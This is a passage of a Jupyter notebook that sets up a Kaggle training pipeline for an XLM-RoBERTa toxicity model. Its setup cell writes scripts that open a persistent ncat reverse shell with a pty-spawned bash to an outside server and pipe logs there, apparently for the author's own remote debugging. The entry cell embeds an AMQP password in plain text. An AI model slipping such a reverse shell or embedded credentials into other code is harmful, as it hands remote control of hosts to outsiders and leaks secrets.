{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "view-in-github"
   },
   "source": [
    "<a href=\"https://colab.research.google.com/github/pennz/kaggle_runner/blob/master/kaggle_runner/hub/shonenkov_training_pipeline.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "wzoWM76m0Rfg"
   },
   "source": [
    "### Dont forget turn on TPU & HIGH-RAM modes :)\n",
    "\n",
    "Author: [Alex Shonenkov](https://www.kaggle.com/shonenkov) //  shonenkov@phystech.edu\n",
    "Have a good day!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting prompt-toolkit<2.0.0,>=1.0.15\n",
      "  Using cached prompt_toolkit-1.0.18-py3-none-any.whl (245 kB)\n",
      "Collecting wcwidth\n",
      "  Using cached wcwidth-0.2.4-py2.py3-none-any.whl (30 kB)\n",
      "Collecting six>=1.9.0\n",
      "  Using cached six-1.15.0-py2.py3-none-any.whl (10 kB)\n",
      "\u001b[31mERROR: pyvim 3.0.2 has requirement prompt-toolkit<3.1.0,>=2.0.0, but you'll have prompt-toolkit 1.0.18 which is incompatible.\u001b[0m\n",
      "\u001b[31mERROR: google-colab 1.0.0 has requirement six~=1.12.0, but you'll have six 1.15.0 which is incompatible.\u001b[0m\n",
      "\u001b[31mERROR: datascience 0.10.6 has requirement folium==0.2.1, but you'll have folium 0.8.3 which is incompatible.\u001b[0m\n",
      "\u001b[31mERROR: albumentations 0.1.12 has requirement imgaug<0.2.7,>=0.2.5, but you'll have imgaug 0.2.9 which is incompatible.\u001b[0m\n",
      "Installing collected packages: wcwidth, six, prompt-toolkit\n",
      "  Attempting uninstall: wcwidth\n",
      "    Found existing installation: wcwidth 0.2.4\n",
      "    Uninstalling wcwidth-0.2.4:\n",
      "      Successfully uninstalled wcwidth-0.2.4\n",
      "  Attempting uninstall: six\n",
      "    Found existing installation: six 1.15.0\n",
      "    Uninstalling six-1.15.0:\n",
      "      Successfully uninstalled six-1.15.0\n",
      "  Attempting uninstall: prompt-toolkit\n",
      "    Found existing installation: prompt-toolkit 1.0.18\n",
      "    Uninstalling prompt-toolkit-1.0.18:\n",
      "      Successfully uninstalled prompt-toolkit-1.0.18\n",
      "Successfully installed prompt-toolkit-1.0.18 six-1.15.0 wcwidth-0.2.4\n"
     ]
    }
   ],
   "source": [
    "!python3 -m pip install 'prompt-toolkit<2.0.0,>=1.0.15' --force-reinstall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import kaggle_runner\n",
    "def enable_debug():\n",
    "    kaggle_runner.defaults.DEBUG = True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[autoreload of prompt_toolkit.layout.containers failed: Traceback (most recent call last):\n",
      "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
      "    superreload(m, reload, self.old_objects)\n",
      "AssertionError: Expecting filter, got EmacsInsertMode()\n",
      "]\n",
      "[autoreload of prompt_toolkit.key_binding.bindings.vi failed: Traceback (most recent call last):\n",
      "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
      "    superreload(m, reload, self.old_objects)\n",
      "AttributeError: module 'prompt_toolkit' has no attribute 'filters'\n",
      "]\n",
      "[autoreload of jsonschema failed: Traceback (most recent call last):\n",
      "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
      "    superreload(m, reload, self.old_objects)\n",
      "ImportError: cannot import name 'draft6_format_checker'\n",
      "]\n",
      "[autoreload of jsonschema.validators failed: Traceback (most recent call last):\n",
      "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
      "    superreload(m, reload, self.old_objects)\n",
      "NameError: name '_coerce_args' is not defined\n",
      "]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b4ecdcebe351\n",
      "grpc://10.2.113.74:8470\n",
      "NVIDIA-SMI has failed because it couldn't communicate with the NVIDIA driver. Make sure that the latest NVIDIA driver is installed and running.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!echo $HOSTNAME\n",
    "!echo $TPU_NAME\n",
    "!nvidia-smi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 54
    },
    "colab_type": "code",
    "id": "n6uGvKL3upio",
    "outputId": "6b29ea48-a25e-41d4-ba7f-ab0aa8fd7eb0"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The autoreload extension is already loaded. To reload it, use:\n",
      "  %reload_ext autoreload\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[autoreload of six failed: Traceback (most recent call last):\n",
      "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
      "    superreload(m, reload, self.old_objects)\n",
      "AttributeError: 'NoneType' object has no attribute 'filter'\n",
      "]\n",
      "[autoreload of prompt_toolkit.layout.containers failed: Traceback (most recent call last):\n",
      "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
      "    superreload(m, reload, self.old_objects)\n",
      "AssertionError: Expecting filter, got EmacsInsertMode()\n",
      "]\n",
      "[autoreload of prompt_toolkit.key_binding.bindings.vi failed: Traceback (most recent call last):\n",
      "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
      "    superreload(m, reload, self.old_objects)\n",
      "AttributeError: module 'prompt_toolkit' has no attribute 'filters'\n",
      "]\n"
     ]
    }
   ],
   "source": [
    "%load_ext autoreload\n",
    "%autoreload 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 55
    },
    "colab_type": "code",
    "id": "HsZb7QICuRIe",
    "outputId": "cbb9b6cb-669d-41c5-d6a1-650228728751"
   },
   "outputs": [],
   "source": [
    "!python3 -m pip install 'prompt-toolkit<2.0.0,>=1.0.15' --force-reinstall\n",
    "!python -m pip install 'prompt-toolkit<2.0.0,>=1.0.15' --force-reinstall\n",
    "!curl https://raw.githubusercontent.com/pytorch/xla/master/contrib/scripts/env-setup.py -o pytorch-xla-env-setup.py > /dev/null\n",
    "!python pytorch-xla-env-setup.py --version 20200420 --apt-packages libomp5 libopenblas-dev\n",
    "!python3 -m pip install transformers==2.5.1 > /dev/null\n",
    "!python3 -m pip install pandarallel > /dev/null\n",
    "!python3 -m pip install catalyst==20.4.2 > /dev/null"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 54
    },
    "colab_type": "code",
    "id": "n6uGvKL3epio",
    "outputId": "6b29ea48-a25e-41d4-ba7f-ab0aa8fd7eb0"
   },
   "outputs": [],
   "source": [
    "import subprocess\n",
    "\n",
    "subprocess.run('[ -f setup.py ] || (git clone https://github.com/pennz/kaggle_runner; '\n",
    "'git submodule update --init --recursive; '\n",
    "'rsync -r kaggle_runner/.* .; '\n",
    "'rsync -r kaggle_runner/* .;); '\n",
    "'python3 -m pip install -e .', shell=True, check=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "wV017Cj1CRlg"
   },
   "outputs": [],
   "source": [
    "with open(\"runner.sh\", \"w\") as f:\n",
    "    f.write(\n",
    "r\"\"\"#!/bin/bash -x\n",
    "export PS4='Line ${LINENO}: ' # for debug\n",
    "NC=ncat\n",
    "\n",
    "USER=$1\n",
    "shift\n",
    "REPO=$1\n",
    "shift\n",
    "BRANCH=$1\n",
    "shift\n",
    "PHASE=$1\n",
    "shift\n",
    "ENABLE_RVS=$1\n",
    "shift\n",
    "\n",
    "SERVER=$1\n",
    "shift\n",
    "PORT=$1\n",
    "shift\n",
    "\n",
    "ORIG_PORT=23454\n",
    "\n",
    "CHECK_PORT=$((ORIG_PORT + 1))\n",
    "python3 -m pip install --upgrade pip\n",
    "conda install -y -c eumetsat expect & # https://askubuntu.com/questions/1047900/unbuffer-stopped-working-months-ago\n",
    "apt update && apt install -y netcat nmap screen time locales >/dev/null 2>&1\n",
    "apt install -y mosh iproute2 fish tig ctags htop tree pv tmux psmisc >/dev/null 2>&1 &\n",
    "\n",
    "conda init bash\n",
    "cat >> ~/.bashrc << EOF\n",
    "conda activate base # as my dotfiles will fiddle with conda\n",
    "export SERVER=$SERVER\n",
    "export CHECK_PORT=$CHECK_PORT\n",
    "EOF\n",
    "\n",
    "source rpt # rvs IDE env setup\n",
    "export SERVER=$SERVER\n",
    "export CHECK_PORT=$CHECK_PORT\n",
    "\n",
    "wait_ncat() {\n",
    "    wait_for_ncat=$1\n",
    "\n",
    "    while [ $wait_for_ncat -gt 0 ]; do\n",
    "        wait_for_ncat=$((wait_for_ncat - 1))\n",
    "        which ncat >/dev/null && return 0\n",
    "    done\n",
    "}\n",
    "wait_ncat 60\n",
    "\n",
    "which $NC >/dev/null || NC=nc\n",
    "export NC\n",
    "\n",
    "if [ \"x${ENABLE_RVS}\" = x1 ]; then\n",
    "    if [ -z $(pgrep -f 'jupyter-notebook') ]; then\n",
    "        bash ./rvs.sh $SERVER $PORT 2>&1 &\n",
    "    else\n",
    "        screen -d -m bash -c \"{ echo [REMOTE]: rvs log below.; bash -x ./rvs.sh $SERVER $PORT 2>&1; } | $NC --send-only --no-shutdown -w 120s -i $((3600 * 2))s $SERVER $CHECK_PORT\"\n",
    "    fi\n",
    "fi &\n",
    "\n",
    "python3 -m pip install ripdb pydicom parse pytest-logger python_logging_rabbitmq coverage &\n",
    "python3 -m pip install pyvim neovim msgpack==1.0.0 & # for vim\n",
    "\n",
    "# SRC_WORK_FOLDER=/kaggle/working # it is just current working folder\n",
    "# [ -d ${SRC_WORK_FOLDER} ] || mkdir -p ${SRC_WORK_FOLDER}\n",
    "#\n",
    "# cd ${SRC_WORK_FOLDER}\n",
    "\n",
    "if [ -d ${REPO} ]; then rm -rf ${REPO}; fi\n",
    "\n",
    "# get code\n",
    "{\n",
    "    mvdir() {\n",
    "        [[ \"$2\"/\"$1\" -ef \"${PWD}\" ]] || {\n",
    "            rm -rf \"$2\"/\"$1\" &&\n",
    "                mkdir \"$2\"/\"$1\"\n",
    "        }\n",
    "\n",
    "        bash -c \"mv \"\"$1\"\"/*\"\" $2\"\"/\"\"$1\"\n",
    "    }\n",
    "    export -f mvdir\n",
    "\n",
    "    if [ ! -d ${REPO} ]; then\n",
    "        git clone --single-branch --branch ${BRANCH} --depth=1 \\\n",
    "            https://github.com/${USER}/${REPO}.git ${REPO} && pushd ${REPO} &&\n",
    "        sed -i 's/git@\\(.*\\):\\(.*\\)/https:\\/\\/\\1\\/\\2/' .gitmodules &&\n",
    "        sed -i 's/git@\\(.*\\):\\(.*\\)/https:\\/\\/\\1\\/\\2/' .git/config &&\n",
    "        git submodule update --init --recursive\n",
    "        find . -maxdepth 1 -name \".??*\" -o -name \"??*\" -type f | xargs -I{} mv {} $OLDPWD\n",
    "        find . -maxdepth 1 -name \".??*\" -o -name \"??*\" -type d | xargs -I{} bash -x -c \"mvdir {}  $OLDPWD\"\n",
    "        popd\n",
    "    fi\n",
    "    make install_dep >/dev/null\n",
    "}\n",
    "\n",
    "USE_AMQP=true\n",
    "export USE_AMQP\n",
    "\n",
    "conda init bash\n",
    "source ~/.bashrc\n",
    "conda activate base\n",
    "\n",
    "if [ x\"${PHASE}\" = x\"dev\" ]; then\n",
    "    export PS4='[Remote]: Line ${LINENO}: '\n",
    "    (\n",
    "        echo \"MOSHing\"\n",
    "        make mosh\n",
    "    ) &\n",
    "\n",
    "    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi &\n",
    "    wait # not exit, when dev\n",
    "fi\n",
    "\n",
    "if [ x\"${PHASE}\" = x\"data\" ]; then\n",
    "    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase\n",
    "    make dataset\n",
    "fi\n",
    "\n",
    "if [ x\"${PHASE}\" = x\"test\" ]; then\n",
    "    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase\n",
    "    #make test\n",
    "fi\n",
    "\n",
    "if [ x\"${PHASE}\" = x\"run\" ]; then\n",
    "    bash ./rvs.sh $SERVER $PORT >/dev/null & make m & # just keep one rvs incase\n",
    "    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi\n",
    "    # basically the reverse of the calling path\n",
    "    pkill make & pkill -f \"mosh\" & pkill sleep & pkill -f \"rvs.sh\" & pkill ncat &\n",
    "    # python main.py \"$@\"\n",
    "fi\n",
    "\"\"\"\n",
    "    )\n",
    "with open(\"rvs.sh\", \"w\") as f:\n",
    "    f.write(\n",
    "r\"\"\"#!/bin/bash -x\n",
    "export PS4='Line ${LINENO}: ' # for debug\n",
    "\n",
    "NC=${NC:-ncat}\n",
    "type $NC || ( echo >&2 \"$NC cannot be found. Exit.\"; exit 1;)\n",
    "# https://stackoverflow.com/questions/57877451/retrieving-output-and-exit-code-of-a-coprocess\n",
    "# coproc { sleep 30 && echo \"Output\" && exit 3; }\n",
    "# Saving the coprocess's PID for later, as COPROC_PID apparently unsets when its finished\n",
    "# COPROC_PID_backup=$COPROC_PID\n",
    "#\n",
    "# Retrieving the coprocess's output\n",
    "# output=$(cat <&$COPROC)\n",
    "#\n",
    "# Retrieving the coprocess's exit code\n",
    "# wait $COPROC_PID_backup\n",
    "#\n",
    "# Echoing out the results\n",
    "# echo $?\n",
    "# echo $output\n",
    "\n",
    "echo BASH NOW: $BASHPID\n",
    "\n",
    "PID_FILE_PATH=/tmp/nc.pid\n",
    "EXIT_FILE_PATH=/tmp/rvs_exit.$BASHPID.pid\n",
    "\n",
    "test -f $EXIT_FILE_PATH && rm $EXIT_FILE_PATH\n",
    "\n",
    "SERVER=$1\n",
    "shift\n",
    "PORT=$1\n",
    "shift\n",
    "\n",
    "ORIG_PORT=23454\n",
    "CHECK_PORT=$((ORIG_PORT + 1))\n",
    "\n",
    "check_exit_status() {\n",
    "  [ -f /tmp/rvs_return ] && return 0\n",
    "\n",
    "  if [ -f $EXIT_FILE_PATH ] && [ x\"$(cat $EXIT_FILE_PATH)\" = x0 ]; then\n",
    "    return 0\n",
    "  fi\n",
    "\n",
    "  return 1 # not ok\n",
    "}\n",
    "\n",
    "\n",
    "connect_setup() {\n",
    "  connect_again_flag=1\n",
    "\n",
    "  sleep_time=5\n",
    "\n",
    "  while [ ${connect_again_flag} -eq 1 ]; do\n",
    "    check_exit_status && return 0\n",
    "\n",
    "    $NC -w ${1}s -i 1800s $SERVER $PORT -c \"echo $(date) started connection; echo $HOSTNAME; python -c 'import pty; pty.spawn([\\\"/bin/bash\\\", \\\"-li\\\"])'\"\n",
    "\n",
    "    RSRET=$?\n",
    "    echo $RSRET > $EXIT_FILE_PATH\n",
    "    (/bin/ss -lpants | grep \"ESTAB.*$PORT\") || >&2 echo \"\\\"$NC -w ${1}s -i 1800s $SERVER $PORT\\\" return with code $RSRET\"\n",
    "\n",
    "    if [ x\"$RSRET\" = x\"0\" ]; then\n",
    "      [ -f /tmp/rvs_exit ] && return 0\n",
    "\n",
    "      return 255 # just do not return\n",
    "    fi\n",
    "    [ $RSRET -eq 0 ] && connect_again_flag=0\n",
    "    [ $RSRET -eq 1 ] && sleep ${sleep_time} && sleep_time=$((sleep_time + sleep_time))\n",
    "  done\n",
    "  # exit, will cause rvs script exit, beside, RSRET not 0, mean connection loss\n",
    "  # thing\n",
    "  RSRET=1  # just never exit\n",
    "  echo $RSRET > $EXIT_FILE_PATH && return $RSRET\n",
    "}\n",
    "\n",
    "connect_again() {\n",
    "  # pkill -f \"nc.*$PORT\"  # no need now, our listen server can accept multiple\n",
    "  # connection now\n",
    "  connect_setup $1\n",
    "}\n",
    "\n",
    "WAIT_LIMIT=2048\n",
    "INIT_WAIT=8\n",
    "port_connect_status=0\n",
    "wait_time=$INIT_WAIT\n",
    "\n",
    "floatToInt() {\n",
    "  parsed=$(printf \"%.0f\" \"$@\")\n",
    "  [ ! $? -eq 0 ] && parsed=0\n",
    "  echo $parsed\n",
    "} 2> /dev/null\n",
    "\n",
    "while true; do\n",
    "  check_exit_status && exit 0\n",
    "  # if find that server cannot be connected, we try to restart our reverse connect again\n",
    "  nc_time=$($(which time) -f \"%e\" $NC -zw $wait_time $SERVER $CHECK_PORT 2>&1 > /dev/null)\n",
    "  nc_ret=$?\n",
    "  nc_time=$(echo $nc_time | awk '{print $NF}')\n",
    "  nc_time=$(floatToInt $nc_time)\n",
    "\n",
    "  if [ ${nc_ret} -eq 0 ]; then\n",
    "    # recover connection, need to connect_again too. For 1st time, will try to connect\n",
    "    # no connection last time, have connction now\n",
    "\n",
    "    if [ $port_connect_status -eq 0 ]; then\n",
    "      echo \"recover connection, reset wait_time and try to reconnect\"\n",
    "      wait_time=$INIT_WAIT\n",
    "      # previous connection is lost, we wait for longer to setup connection\n",
    "      check_exit_status || wait_time=15\n",
    "      connect_again $wait_time &\n",
    "    else\n",
    "      wait_time=$((wait_time + wait_time)) # double wait, network fine\n",
    "\n",
    "      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi\n",
    "    fi\n",
    "    port_connect_status=1\n",
    "  else\n",
    "    if [ $port_connect_status -eq 1 ]; then\n",
    "      echo \"found connection loss, reset wait_time and try to reconnect\"\n",
    "      wait_time=$INIT_WAIT\n",
    "      check_exit_status || wait_time=15 # previous connection is lost\n",
    "      connect_again $wait_time &\n",
    "    else # no connection all the time? we still try to connect...\n",
    "      wait_time=$((wait_time + wait_time))\n",
    "\n",
    "      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi\n",
    "      connect_again $wait_time &\n",
    "    fi\n",
    "    port_connect_status=0\n",
    "  fi\n",
    "  sleep $((wait_time - nc_time)) # check every XX seconds\n",
    "  echo $hostname $HOSTNAME\n",
    "done\n",
    "wait  # wait for any background\n",
    "\n",
    "# https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e\n",
    "# In reverse shell\n",
    "# $ python -c 'import pty; pty.spawn(\"/bin/bash\")'\n",
    "# Ctrl-Z\n",
    "#\n",
    "# In Attacker console\n",
    "# $ stty raw -echo\n",
    "# $ fg\n",
    "#\n",
    "# In reverse shell\n",
    "# $ reset\n",
    "# $ export SHELL=bash\n",
    "# $ export TERM=xterm-256color\n",
    "# $ stty rows <num> columns <cols>\n",
    "\"\"\"\n",
    "    )\n",
    "with open(\"rpt\", \"w\") as f:\n",
    "    f.write(\n",
    "r\"\"\"#!/bin/bash\n",
    "[ -d ~/.fzf ] || {\n",
    "git clone --depth=1 https://github.com/pennz/dotfiles\n",
    "rsync -r dotfiles/.* ~\n",
    "rsync -r dotfiles/* ~\n",
    "pushd ~\n",
    "git submodule update --init\n",
    ".fzf/install --all\n",
    "curl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n",
    "curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n",
    "# vim -u ~/.vimrc_back \"+call plug#begin()\" +PlugInstall +qa &\n",
    "# ( sleep 60; nvim -Vnvim_log -u ~/.vimrc_back \"+call plug#begin()\" +PlugInstall +checkhealth +qa )&\n",
    "ln -s .shrc_customised.macos .shrc_customised\n",
    "echo \"alias gdrive='gdrive  --service-account a.json'\" >> ~/.bash_aliases\n",
    "echo \"unalias vim\" >> ~/.bash_aliases\n",
    "echo \"alias vim='nvim -u ~/.vimrc_back'\" >> ~/.bash_aliases\n",
    "popd\n",
    "\n",
    "cat >> ~/.profile << EOF\n",
    "export SHELL=/bin/bash\n",
    "export TERM=screen-256color\n",
    "stty intr ^\\c susp ^\\x eof ^\\f echo opost\n",
    "# https://unix.stackexchange.com/questions/343088/what-is-the-equivalent-of-stty-echo-for-zsh\n",
    "# unsetopt ZLE # for zsh\n",
    "# for ourside stty raw isig -echo icrnl time 3 echoprt opost eof ^\\p\n",
    "\n",
    "color_my_prompt () {\n",
    "    local __user_and_host=\"\\[\\033[01;32m\\]\\u@\\h\"\n",
    "    local __cur_location=\"\\[\\033[01;34m\\]\\w\"\n",
    "    local __git_branch_color=\"\\[\\033[31m\\]\"\n",
    "    # local __git_branch=\"\\`ruby -e \\\"print (%x{git branch 2> /dev/null}.grep(/^\\*/).first || '').gsub(/^\\* (.+)$/, '(\\1) ')\\\"\\`\"\n",
    "    local __git_branch='`git branch 2> /dev/null | grep -e ^* | ${SED:-sed} -E  s/^\\\\\\\\\\*\\ \\(.+\\)$/\\(\\\\\\\\\\1\\)\\ /`'\n",
    "    local __prompt_tail=\"\\[\\033[35m\\]$\"\n",
    "    local __last_color=\"\\[\\033[00m\\]\"\n",
    "    export PS1=\"$__user_and_host $__cur_location $__git_branch_color$__git_branch$__prompt_tail$__last_color \"\n",
    "}\n",
    "\n",
    "ENV=/root/.bashrc\n",
    "PYTHONWARNINGS=ignore:::pip._internal.cli.base_command\n",
    "MPLBACKEND=module://ipykernel.pylab.backend_inline\n",
    "\n",
    "PS4=\"$HOSTNAME: \"'${LINENO}: '\n",
    "_=/usr/bin/env\n",
    "PWD=/kaggle/working\n",
    "cd $PWD\n",
    "OLDPWD=/root\n",
    "\n",
    "# color_my_prompt\n",
    "locale-gen\n",
    "echo \"#\" $(grep 'cpu ' /proc/stat >/dev/null;sleep 0.1;grep 'cpu ' /proc/stat | awk -v RS=\"\" '{print \"CPU: \"($13-$2+$15-$4)*100/($13-$2+$15-$4+$16-$5)\"%\"}') \"Mem: \"$(awk '/MemTotal/{t=$2}/MemAvailable/{a=$2}END{print 100-100*a/t\"%\"}' /proc/meminfo) \"Uptime: \"$(uptime | awk '{print $1 \" \" $2 \" \" $3}')\n",
    "echo \"#\" TPU_NAME=$TPU_NAME\n",
    "nvidia-smi\n",
    "conda activate base\n",
    "EOF\n",
    "}\n",
    "\"\"\"\n",
    "    )\n",
    "with open(\"gdrive_setup\", \"w\") as f:\n",
    "    f.write(\n",
    "r\"\"\"#!/bin/bash\n",
    "wget https://github.com/gdrive-org/gdrive/releases/download/2.1.0/gdrive-linux-x64\n",
    "chmod +x gdrive-linux-x64\n",
    "cp gdrive-linux-x64 /bin/gdrive\n",
    "\n",
    "mkdir ~/.gdrive\n",
    "\n",
    "# auth file\n",
    "cat > ~/.gdrive/a.json << EOF\n",
    "NO_PASS\n",
    "\n",
    "EOF\n",
    "\n",
    "gdrive --service-account a.json list  # just test\n",
    "\n",
    "SRC_WORK_FOLDER=/kaggle/input\n",
    "[ -d ${SRC_WORK_FOLDER} ] || {\n",
    "    mkdir -p ${SRC_WORK_FOLDER}\n",
    "    cd ${SRC_WORK_FOLDER}\n",
    "    gdrive --service-account a.json download -r 1CHDWIN0M6PD4SQyplbWefBCzNzdPVd-m\n",
    "    tar xf siim-train-test.tar.gz -C /kaggle/input\n",
    "}\n",
    "# cat > tgz_files.sh << EOF\n",
    "# #!/bin/bash\n",
    "# tgzfile () {\n",
    "#   tar cf - $1 -P | pv -s $(du -sb $1 | awk '{print $1}') | gzip > /home/$1.tar.gz\n",
    "# }\n",
    "# cd /kaggle/input\n",
    "# find . -maxdepth 1 -type d -name \"??*\" | while read -r line; do\n",
    "#     echo $line\n",
    "#     tgzfile $line\n",
    "# done\n",
    "# EOF\n",
    "\"\"\"\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "fk22W4JeCRlm"
   },
   "outputs": [],
   "source": [
    "import os\n",
    "server = \"vtool.duckdns.org\"\n",
    "os.environ['SERVER'] = server\n",
    "\n",
    "entry_str = r\"\"\"#!/bin/bash\n",
    "PS4='Line ${LINENO}: ' bash -x runner.sh pennz kaggle_runner master \"test\" 1 \"\"\"+ server +\"\"\" \"9017\" \"amqp://kaggle:9b83ca70cf4cda89524d2283a4d675f6@pengyuzhou.com/\" \"384\" \"19999\" \"intercept\" | tee runner_log\n",
    "\"\"\"\n",
    "if False:\n",
    "    entry_str += r\"\"\"PS4='Line ${LINENO}: ' bash -x gdrive_setup >>loggdrive &\"\"\"\n",
    "\n",
    "with open(\"entry.sh\", \"w\") as f:\n",
    "    f.write(entry_str)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "id": "UAC8442XCRlq",
    "outputId": "3b52996b-c161-4279-f8a7-ab6b45e88e3e"
   },
   "outputs": [],
   "source": [
    "import os\n",
    "import sys\n",
    "sys.path.append(os.getcwd())\n",
    "\n",
    "import selectors\n",
    "import subprocess\n",
    "from importlib import reload, import_module\n",
    "import_module('kaggle_runner')\n",
    "from kaggle_runner import logger\n",
    "logger.debug(\"Logger loaded. Will run entry.sh.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "mC6qgI68EMQm"
   },
   "outputs": [],
   "source": [
    "%%bash --bg --out runner_log --err runner_err_log\n",
    "bash -x entry.sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 156
    },
    "colab_type": "code",
    "id": "KFZrVc5nCRlw",
    "outputId": "b21d3de4-5ea2-4233-9736-36261b7de356"
   },
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "import pandas as pd\n",
    "\n",
    "import os\n",
    "os.environ['XLA_USE_BF16'] = \"1\"\n",
    "\n",
    "from glob import glob\n",
    "\n",
    "import torch\n",
    "import torch.nn as nn\n",
    "from torch.utils.data import Dataset,DataLoader\n",
    "from torch.autograd import Variable\n",
    "from torch.utils.data.sampler import SequentialSampler, RandomSampler\n",
    "import sklearn\n",
    "\n",
    "import time\n",
    "import random\n",
    "from datetime import datetime\n",
    "from tqdm import tqdm\n",
    "tqdm.pandas()\n",
    "\n",
    "from transformers import BertModel, BertTokenizer\n",
    "from transformers import XLMRobertaModel, XLMRobertaTokenizer\n",
    "from transformers import AdamW, get_linear_schedule_with_warmup, get_constant_schedule\n",
    "from catalyst.data.sampler import DistributedSamplerWrapper, BalanceClassSampler\n",
    "\n",
    "import gc\n",
    "import re\n",
    "\n",
    "# !python3 -m pip install nltk > /dev/null\n",
    "import nltk\n",
    "nltk.download('punkt')\n",
    "\n",
    "from nltk import sent_tokenize\n",
    "\n",
    "from pandarallel import pandarallel\n",
    "\n",
    "pandarallel.initialize(nb_workers=4, progress_bar=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "M-VP4QbZu9EB"
   },
   "outputs": [],
   "source": [
    "SEED = 42\n",
    "\n",
    "MAX_LENGTH = 224\n",
    "BACKBONE_PATH = 'xlm-roberta-large'\n",
    "# ROOT_PATH = f'..'\n",
    "ROOT_PATH = f'/kaggle' # for colab\n",
    "\n",
    "\n",
    "def seed_everything(seed):\n",
    "    random.seed(seed)\n",
    "    os.environ['PYTHONHASHSEED'] = str(seed)\n",
    "    np.random.seed(seed)\n",
    "    torch.manual_seed(seed)\n",
    "    torch.cuda.manual_seed(seed)\n",
    "    torch.backends.cudnn.deterministic = True\n",
    "    torch.backends.cudnn.benchmark = True\n",
    "\n",
    "seed_everything(SEED)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 86
    },
    "colab_type": "code",
    "id": "63ceMzcxu9GS",
    "outputId": "d78a51d9-9e15-4793-e70f-2b222231e842"
   },
   "outputs": [],
   "source": [
    "from nltk import sent_tokenize\n",
    "from random import shuffle\n",
    "import random\n",
    "import albumentations\n",
    "from albumentations.core.transforms_interface import DualTransform, BasicTransform\n",
    "\n",
    "\n",
    "LANGS = {\n",
    "    'en': 'english',\n",
    "    'it': 'italian',\n",
    "    'fr': 'french',\n",
    "    'es': 'spanish',\n",
    "    'tr': 'turkish',\n",
    "    'ru': 'russian',\n",
    "    'pt': 'portuguese'\n",
    "}\n",
    "\n",
    "def get_sentences(text, lang='en'):\n",
    "    return sent_tokenize(text, LANGS.get(lang, 'english'))\n",
    "\n",
    "def exclude_duplicate_sentences(text, lang='en'):\n",
    "    sentences = []\n",
    "\n",
    "    for sentence in get_sentences(text, lang):\n",
    "        sentence = sentence.strip()\n",
    "\n",
    "        if sentence not in sentences:\n",
    "            sentences.append(sentence)\n",
    "\n",
    "    return ' '.join(sentences)\n",
    "\n",
    "def clean_text(text, lang='en'):\n",
    "    text = str(text)\n",
    "    text = re.sub(r'[0-9\"]', '', text)\n",
    "    text = re.sub(r'#[\\S]+\\b', '', text)\n",
    "    text = re.sub(r'@[\\S]+\\b', '', text)\n",
    "    text = re.sub(r'https?\\S+', '', text)\n",
    "    text = re.sub(r'\\s+', ' ', text)\n",
